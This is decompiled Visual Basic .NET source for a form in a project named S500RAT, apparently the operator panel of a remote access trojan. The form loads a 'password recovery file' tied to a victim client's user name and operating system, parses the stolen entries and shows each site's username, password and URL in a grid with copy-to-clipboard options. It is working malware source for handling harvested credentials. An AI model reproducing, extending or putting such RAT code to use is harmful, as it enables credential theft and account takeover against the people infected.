Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Guna.UI2.WinForms
Imports Guna.UI2.WinForms.Enums
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.My

Namespace S500RAT
	' Token: 0x02000030 RID: 48
	<DesignerGenerated()>
	Public Partial Class FormPasswordView
		Inherits Form

		' Token: 0x06000E09 RID: 3593 RVA: 0x0007D3A6 File Offset: 0x0007B5A6
		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.PasswordView_Load
			AddHandler MyBase.Resize, AddressOf Me.PasswordView_Resize
			Me.ScreenSize = False
			Me.InitializeComponent()
		End Sub

		' Token: 0x170005BF RID: 1471
		' (get) Token: 0x06000E0C RID: 3596 RVA: 0x0007E50C File Offset: 0x0007C70C
		' (set) Token: 0x06000E0D RID: 3597 RVA: 0x0007E516 File Offset: 0x0007C716
		Friend Overridable Property ListPassword As DataGridView

		' Token: 0x170005C0 RID: 1472
		' (get) Token: 0x06000E0E RID: 3598 RVA: 0x0007E51F File Offset: 0x0007C71F
		' (set) Token: 0x06000E0F RID: 3599 RVA: 0x0007E529 File Offset: 0x0007C729
		Friend Overridable Property Guna2ResizeBox1 As Guna2ResizeBox

		' Token: 0x170005C1 RID: 1473
		' (get) Token: 0x06000E10 RID: 3600 RVA: 0x0007E532 File Offset: 0x0007C732
		' (set) Token: 0x06000E11 RID: 3601 RVA: 0x0007E53C File Offset: 0x0007C73C
		Private Overridable Property ClientInfo As Label

		' Token: 0x170005C2 RID: 1474
		' (get) Token: 0x06000E12 RID: 3602 RVA: 0x0007E545 File Offset: 0x0007C745
		' (set) Token: 0x06000E13 RID: 3603 RVA: 0x0007E54F File Offset: 0x0007C74F
		Private Overridable Property Label13 As Label

		' Token: 0x170005C3 RID: 1475
		' (get) Token: 0x06000E14 RID: 3604 RVA: 0x0007E558 File Offset: 0x0007C758
		' (set) Token: 0x06000E15 RID: 3605 RVA: 0x0007E562 File Offset: 0x0007C762
		Friend Overridable Property Guna2Elipse1 As Guna2Elipse

		' Token: 0x170005C4 RID: 1476
		' (get) Token: 0x06000E16 RID: 3606 RVA: 0x0007E56B File Offset: 0x0007C76B
		' (set) Token: 0x06000E17 RID: 3607 RVA: 0x0007E575 File Offset: 0x0007C775
		Friend Overridable Property ImageList1 As ImageList

		' Token: 0x170005C5 RID: 1477
		' (get) Token: 0x06000E18 RID: 3608 RVA: 0x0007E57E File Offset: 0x0007C77E
		' (set) Token: 0x06000E19 RID: 3609 RVA: 0x0007E588 File Offset: 0x0007C788
		Friend Overridable Property DataGridViewImageColumn3 As DataGridViewImageColumn

		' Token: 0x170005C6 RID: 1478
		' (get) Token: 0x06000E1A RID: 3610 RVA: 0x0007E591 File Offset: 0x0007C791
		' (set) Token: 0x06000E1B RID: 3611 RVA: 0x0007E59B File Offset: 0x0007C79B
		Friend Overridable Property Column1 As DataGridViewTextBoxColumn

		' Token: 0x170005C7 RID: 1479
		' (get) Token: 0x06000E1C RID: 3612 RVA: 0x0007E5A4 File Offset: 0x0007C7A4
		' (set) Token: 0x06000E1D RID: 3613 RVA: 0x0007E5AE File Offset: 0x0007C7AE
		Friend Overridable Property DataGridViewTextBoxColumn3 As DataGridViewTextBoxColumn

		' Token: 0x170005C8 RID: 1480
		' (get) Token: 0x06000E1E RID: 3614 RVA: 0x0007E5B7 File Offset: 0x0007C7B7
		' (set) Token: 0x06000E1F RID: 3615 RVA: 0x0007E5C1 File Offset: 0x0007C7C1
		Friend Overridable Property DataGridViewTextBoxColumn6 As DataGridViewTextBoxColumn

		' Token: 0x170005C9 RID: 1481
		' (get) Token: 0x06000E20 RID: 3616 RVA: 0x0007E5CA File Offset: 0x0007C7CA
		' (set) Token: 0x06000E21 RID: 3617 RVA: 0x0007E5D4 File Offset: 0x0007C7D4
		Friend Overridable Property DataGridViewTextBoxColumn7 As DataGridViewTextBoxColumn

		' Token: 0x170005CA RID: 1482
		' (get) Token: 0x06000E22 RID: 3618 RVA: 0x0007E5DD File Offset: 0x0007C7DD
		' (set) Token: 0x06000E23 RID: 3619 RVA: 0x0007E5E7 File Offset: 0x0007C7E7
		Friend Overridable Property ControllContextMenuStrip As ContextMenuStrip

		' Token: 0x170005CB RID: 1483
		' (get) Token: 0x06000E24 RID: 3620 RVA: 0x0007E5F0 File Offset: 0x0007C7F0
		' (set) Token: 0x06000E25 RID: 3621 RVA: 0x0007E5FC File Offset: 0x0007C7FC
		Friend Overridable Property CopyUser As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._CopyUser
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CopyUser_Click
				Dim copyUser As ToolStripMenuItem = Me._CopyUser
				If copyUser IsNot Nothing Then
					RemoveHandler copyUser.Click, value2
				End If
				Me._CopyUser = value
				copyUser = Me._CopyUser
				If copyUser IsNot Nothing Then
					AddHandler copyUser.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170005CC RID: 1484
		' (get) Token: 0x06000E26 RID: 3622 RVA: 0x0007E63F File Offset: 0x0007C83F
		' (set) Token: 0x06000E27 RID: 3623 RVA: 0x0007E64C File Offset: 0x0007C84C
		Friend Overridable Property CopyPassword As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._CopyPassword
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CopyPassword_Click
				Dim copyPassword As ToolStripMenuItem = Me._CopyPassword
				If copyPassword IsNot Nothing Then
					RemoveHandler copyPassword.Click, value2
				End If
				Me._CopyPassword = value
				copyPassword = Me._CopyPassword
				If copyPassword IsNot Nothing Then
					AddHandler copyPassword.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170005CD RID: 1485
		' (get) Token: 0x06000E28 RID: 3624 RVA: 0x0007E68F File Offset: 0x0007C88F
		' (set) Token: 0x06000E29 RID: 3625 RVA: 0x0007E69C File Offset: 0x0007C89C
		Friend Overridable Property CopyURL As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._CopyURL
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CopyURL_Click
				Dim copyURL As ToolStripMenuItem = Me._CopyURL
				If copyURL IsNot Nothing Then
					RemoveHandler copyURL.Click, value2
				End If
				Me._CopyURL = value
				copyURL = Me._CopyURL
				If copyURL IsNot Nothing Then
					AddHandler copyURL.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170005CE RID: 1486
		' (get) Token: 0x06000E2A RID: 3626 RVA: 0x0007E6DF File Offset: 0x0007C8DF
		' (set) Token: 0x06000E2B RID: 3627 RVA: 0x0007E6E9 File Offset: 0x0007C8E9
		Friend Overridable Property Guna2BorderlessForm1 As Guna2BorderlessForm

		' Token: 0x170005CF RID: 1487
		' (get) Token: 0x06000E2C RID: 3628 RVA: 0x0007E6F2 File Offset: 0x0007C8F2
		' (set) Token: 0x06000E2D RID: 3629 RVA: 0x0007E6FC File Offset: 0x0007C8FC
		Friend Overridable Property Guna2DragControl1 As Guna2DragControl

		' Token: 0x170005D0 RID: 1488
		' (get) Token: 0x06000E2E RID: 3630 RVA: 0x0007E705 File Offset: 0x0007C905
		' (set) Token: 0x06000E2F RID: 3631 RVA: 0x0007E70F File Offset: 0x0007C90F
		Friend Overridable Property Mini As ValleyMini

		' Token: 0x170005D1 RID: 1489
		' (get) Token: 0x06000E30 RID: 3632 RVA: 0x0007E718 File Offset: 0x0007C918
		' (set) Token: 0x06000E31 RID: 3633 RVA: 0x0007E722 File Offset: 0x0007C922
		Friend Overridable Property MAX As ValleyMax

		' Token: 0x170005D2 RID: 1490
		' (get) Token: 0x06000E32 RID: 3634 RVA: 0x0007E72B File Offset: 0x0007C92B
		' (set) Token: 0x06000E33 RID: 3635 RVA: 0x0007E738 File Offset: 0x0007C938
		Friend Overridable Property ExitForm As ValleyClose
			<CompilerGenerated()>
			Get
				Return Me._ExitForm
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ValleyClose)
				Dim value2 As EventHandler = AddressOf Me.ExitForm_Click
				Dim exitForm As ValleyClose = Me._ExitForm
				If exitForm IsNot Nothing Then
					RemoveHandler exitForm.Click, value2
				End If
				Me._ExitForm = value
				exitForm = Me._ExitForm
				If exitForm IsNot Nothing Then
					AddHandler exitForm.Click, value2
				End If
			End Set
		End Property

		' Token: 0x06000E34 RID: 3636 RVA: 0x0007E77C File Offset: 0x0007C97C
		Private Sub PasswordView_Load(sender As Object, e As EventArgs)
			' The following expression was wrapped in a checked-statement
			Try
				Me.MinimumSize = MyBase.Size
				Me.ClientInfo.Text = "Client info - " + Me.User + " \ " + Me.SystemOs
				Me.ScreenSize = True
				Try
					Dim flag As Boolean = Not File.Exists(Me.PasswordsPath)
					If flag Then
						MessageBox.Show("Sorry, Password recovery file was not found!", "Recovery Passwords!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
						Return
					End If
				Catch ex As Exception
					Console.WriteLine(ex.Message)
				End Try
				Dim text As String = File.ReadAllText(Me.PasswordsPath)
				Dim array As String() = text.Split(New String() { "%|SPL|%" }, StringSplitOptions.None)
				Dim num As Integer = array.Length - 1
				For i As Integer = 0 To num
					Dim flag2 As Boolean = array(i).Length > 0
					If flag2 Then
						Dim array2 As String() = array(i).Split(New String() { "|'S'|" }, StringSplitOptions.None)
						Me.ListPassword.Rows.Add(New Object() { Me.ImageList1.Images(array2(0).ToString() + ".png"), array2(0), array2(1), array2(2), array2(3) })
					End If
					i += 2
				Next
			Catch ex2 As Exception
				Console.WriteLine(ex2.Message)
			End Try
		End Sub

		' Token: 0x06000E35 RID: 3637 RVA: 0x0007E934 File Offset: 0x0007CB34
		Private Sub PasswordView_Resize(sender As Object, e As EventArgs)
			Dim flag As Boolean = Not Me.ScreenSize
			If flag Then
				Dim width As Integer = Screen.PrimaryScreen.Bounds.Width
				Dim height As Integer = Screen.PrimaryScreen.Bounds.Height
				Dim width2 As Integer = MyBase.Width
				Dim height2 As Integer = MyBase.Height
				Dim x As Integer = CInt(Math.Round(CDbl((width - width2)) / 2.0))
				Dim y As Integer = CInt(Math.Round(CDbl((height - height2)) / 2.0))
				MyBase.Location = New Point(x, y)
			End If
		End Sub

		' Token: 0x06000E36 RID: 3638 RVA: 0x0007E9C8 File Offset: 0x0007CBC8
		Private Sub CopyUser_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.ListPassword.Rows.Count > 0
			If flag Then
				Try
					For Each obj As Object In Me.ListPassword.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						MyProject.Computer.Clipboard.SetText(Conversions.ToString(dataGridViewRow.Cells(2).Value))
					Next
				Catch ex As Exception
					Console.WriteLine(ex.Message)
				End Try
			End If
		End Sub

		' Token: 0x06000E37 RID: 3639 RVA: 0x0007EA74 File Offset: 0x0007CC74
		Private Sub CopyPassword_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.ListPassword.Rows.Count > 0
			If flag Then
				Try
					For Each obj As Object In Me.ListPassword.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						MyProject.Computer.Clipboard.SetText(Conversions.ToString(dataGridViewRow.Cells(3).Value))
					Next
				Catch ex As Exception
					Console.WriteLine(ex.Message)
				End Try
			End If
		End Sub

		' Token: 0x06000E38 RID: 3640 RVA: 0x0007EB20 File Offset: 0x0007CD20
		Private Sub CopyURL_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.ListPassword.Rows.Count > 0
			If flag Then
				Try
					For Each obj As Object In Me.ListPassword.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						MyProject.Computer.Clipboard.SetText(Conversions.ToString(dataGridViewRow.Cells(4).Value))
					Next
				Catch ex As Exception
					Console.WriteLine(ex.Message)
				End Try
			End If
		End Sub

		' Token: 0x06000E39 RID: 3641 RVA: 0x0007EBCC File Offset: 0x0007CDCC
		Private Sub ExitForm_Click(sender As Object, e As EventArgs)
			MyBase.Close()
		End Sub

		' Token: 0x04000662 RID: 1634
		Public User As String

		' Token: 0x04000663 RID: 1635
		Public SystemOs As String

		' Token: 0x04000664 RID: 1636
		Private ScreenSize As Boolean

		' Token: 0x04000665 RID: 1637
		Public PasswordsPath As String
	End Class
End Namespace
